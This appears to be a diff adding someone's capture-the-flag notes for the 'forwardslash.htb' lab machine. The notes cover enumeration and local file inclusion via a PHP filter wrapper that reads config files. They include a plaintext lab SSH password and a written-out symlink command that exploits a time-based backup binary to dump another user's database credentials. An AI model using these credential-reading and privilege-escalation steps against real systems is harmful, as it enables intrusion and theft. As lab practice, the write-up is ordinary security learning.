@@ -1,0 +1,63 @@
+- Did nmap found 2 ports open 22 and 80.
+- mapping 80 to forwardslash.htb showed a defaced page hinting at some xml file and anonymous ftp logins
+- ran gobuster with type txt and found a note hinting at a backup site
+- ran gobuster on vhost and found backup.forwardslash.htb
+- It had a forbidden dev directory
+- was redirected to a login page, made account and was shown 6 phps
+- one of them had lfi (http://backup.forwardslash.htb/profilepicture.php) on a client side disabled form
+- used php filter wrapper to read ./config.php , found mysql creds. ran it on ./dev/index.php which gave me chiv's creds.
+- "chiv", 'N0bodyL1kesBack/'
+- got ssh as chiv
+- chiv had nothing but could cd into pain's home
+- pain had an encrypter python script and a note hinting at crypto
+- in the /var/backups directory there was a config.php.bak with a note saying it contained pains creds
+- backup binary had a banner looking like this
+
+----------------------------------------------------------------------
+	Pain's Next-Gen Time Based Backup Viewer
+	v0.1
+	NOTE: not reading the right file yet,
+	only works if backup is taken in same second
+----------------------------------------------------------------------
+
+Current Time: 15:05:10
+ERROR: 3a06350f3aa7f469f1923ec45458e9c9 Does Not Exist or Is Not Accessible By Me, Exiting...
+
+- The hash like thing at the bottom is an MD5 of current time
+- So wrote this script to symlink config.php.bak in chivs home with the name as MD5 hash
+
+ln -s /var/backups/config.php.bak $(echo -n $(date +"%T") | md5sum | awk '{print $1}')
+backup
+
+- running it gave pain's creds
+
+15:24:07
+a7dfe32843c062ca707b246c11419153
+----------------------------------------------------------------------
+	Pain's Next-Gen Time Based Backup Viewer
+	v0.1
+	NOTE: not reading the right file yet,
+	only works if backup is taken in same second
+----------------------------------------------------------------------
+
+Current Time: 15:24:07
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'pain');
+define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
+define('DB_NAME', 'site');
+
+/* Attempt to connect to MySQL database */
+$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+
+// Check connection
+if($link === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+}
+?>
+
+- Got user !!
+- What can i put in luks encrypted image
+    *
